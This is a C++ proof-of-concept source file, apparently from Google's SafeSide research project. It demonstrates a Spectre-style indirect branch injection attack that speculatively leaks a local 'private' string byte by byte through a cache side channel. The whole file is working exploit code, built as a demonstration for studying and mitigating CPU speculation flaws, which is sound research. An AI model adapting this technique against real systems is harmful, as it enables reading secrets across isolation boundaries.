/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#include <array>
#include <cstring>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"

const char *public_data = "Hello, world!";
const char *private_data = "It's a s3kr3t!!!";

// Recursive templates to repeat code without using .rept in inline assembly.
// Fetch address N-times in the RealRead.
template<unsigned int N> struct Fetches {
  SAFESIDE_ALWAYS_INLINE static inline void generate(const void *addr) {
    (void)*reinterpret_cast<const volatile char *>(addr);
    Fetches<N - 1>::generate(addr);
  }
};

template<> struct Fetches<0> {
  SAFESIDE_ALWAYS_INLINE static inline void generate(const void *addr) {
    // Empty.
  }
};

// Invoke indirectly RealRead with the safe address in the LeakByte.
template<unsigned int N> struct SafeCalls {
  SAFESIDE_ALWAYS_INLINE static inline void generate(
#if SAFESIDE_X64 || SAFESIDE_ARM64
     void (*real_reader)(const void *),
#elif SAFESIDE_IA32
     void (SAFESIDE_FASTCALL *real_reader)(const void *),
#else
#  error Unsupported architecture.
#endif
     const void *safe_address) {
    real_reader(safe_address);
    SafeCalls<N - 1>::generate(real_reader, safe_address);
  }
};

template<> struct SafeCalls<0> {
  SAFESIDE_ALWAYS_INLINE static inline void generate(
#if SAFESIDE_X64 || SAFESIDE_ARM64
     void (*real_reader)(const void *),
#elif SAFESIDE_IA32
     void (SAFESIDE_FASTCALL *real_reader)(const void *),
#else
#  error Unsupported architecture.
#endif
     const void *safe_address) {
    // Empty.
  }
};

// We use fastcalls in the 32-bit mode so that there is only one instruction.
// Otherwise there would be two (fetch the pointer from the stack and fetch from
// the pointer).
#if SAFESIDE_IA32
SAFESIDE_FASTCALL
#endif
void FirstActualRead(const void *addr) {
  // We read the value 100 times to have enough places to jump to.
  Fetches<100>::generate(addr);
}

#if SAFESIDE_IA32
SAFESIDE_FASTCALL
#endif
void DummyRead(const void *addr) {
  // Does nothing.
}

#if SAFESIDE_IA32
SAFESIDE_FASTCALL
#endif
void SecondActualRead(const void *addr) {
  // Read it one more time to avoid compiler deduplication with jump.
  Fetches<101>::generate(addr);
}

static char leak_byte(const char *data, size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  // Pointer to pointer to DummyRead so that we can easily flush it from
  // the cache and start speculative execution.
#if SAFESIDE_X64 || SAFESIDE_ARM64
  std::unique_ptr<void(*)(const void *)> dummy_reader =
      std::unique_ptr<void(*)(const void *)>(new (void (*)(const void *)));
#elif SAFESIDE_IA32
  std::unique_ptr<void(SAFESIDE_FASTCALL *)(const void *)> dummy_reader =
      std::unique_ptr<void(SAFESIDE_FASTCALL *)(const void *)>(
          new (void (SAFESIDE_FASTCALL *)(const void *)));
#else
#  error Unsupported architecture.
#endif
  // Dummy reader always points to the DummyRead and never moves.
  *dummy_reader = DummyRead;

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();

    // We pick a different offset every time so that it's guaranteed that the
    // value of the in-bounds access is usually different from the secret value
    // we want to leak via out-of-bounds speculative access.
    size_t safe_offset = run % strlen(data);

    // We are going to shift these pointer over instructions in the read
    // functions.
    char *first_ptr = reinterpret_cast<char *>(FirstActualRead);
    char *second_ptr = reinterpret_cast<char *>(SecondActualRead);

    for (int i = 0; i < 100; ++i) {
      // Shift real readers to the next instruction to diversify
      // destination addresses.
#if SAFESIDE_X64 || SAFESIDE_IA32
#  ifdef __clang__
      // CLang uses movb to al as the dummy fetch instruction and that has 2
      // bytes.
      first_ptr += 2;
      second_ptr += 2;
#  elif defined(__INTEL_COMPILER)
      // ICC makes cycles of length 5. First three are movs that have 2 bytes,
      // last two are movs that have 3 bytes.
      first_ptr += 2 + static_cast<bool>(i % 5 > 2);
      second_ptr += 2 + static_cast<bool>(i % 5 > 2);
#  elif defined(__GNUC__)
      // G++ uses movzbl to eax and that has 3 bytes.
      first_ptr += 3;
      second_ptr += 3;
#  else
#    error Unsupported compiler.
#  endif
#elif SAFESIDE_ARM64
      // ARM instructions are always 4 bytes.
      first_ptr += 4;
      second_ptr += 4;
#else
#  error Unsupported architecture.
#endif

#if SAFESIDE_X64 || SAFESIDE_ARM64
      void (*first_real_reader)(const void *) =
          reinterpret_cast<void (*)(const void *)>(first_ptr);
      void (*second_real_reader)(const void *) =
          reinterpret_cast<void (*)(const void *)>(second_ptr);
#elif SAFESIDE_IA32
      void (SAFESIDE_FASTCALL *first_real_reader)(const void *) =
          reinterpret_cast<void (SAFESIDE_FASTCALL *)(const void *)>(
              first_ptr);
      void (SAFESIDE_FASTCALL *second_real_reader)(const void *) =
          reinterpret_cast<void (SAFESIDE_FASTCALL *)(const void *)>(
              second_ptr);
#else
#  error Unsupported architecture.
#endif

      // 97 times we access the safe value with the second real reader. This
      // inlines the indirect call to many source addresses and keeps room for
      // the next indirect call if it followed the same relative shift.
      SafeCalls<97>::generate(
          second_real_reader, isolated_oracle.data() + static_cast<size_t>(
              data[safe_offset]));

      // Flush the dummy reader from the cache to start the speculation.
      CLFlush(dummy_reader.get());

      // One time we call the unsafe value with the dummy reader. It jumps
      // speculatively somewhere into real readers which is a pure injection
      // because this jump leads architecturally always to only one place.
      (*dummy_reader)(
          isolated_oracle.data() + static_cast<size_t>(data[offset]));

      // 97 other times we access the safe value with the first real reader.
      // This inlines the indirect call to other source addresses and adds
      // destinations above the dummy reader.
      SafeCalls<97>::generate(
          first_real_reader, isolated_oracle.data() + static_cast<size_t>(
              data[safe_offset]));
    }

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cout << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    // On at least some machines, this will print the i'th byte from
    // private_data, despite the only actually-executed memory accesses being
    // to valid bytes in public_data.
    std::cout << leak_byte(public_data, private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
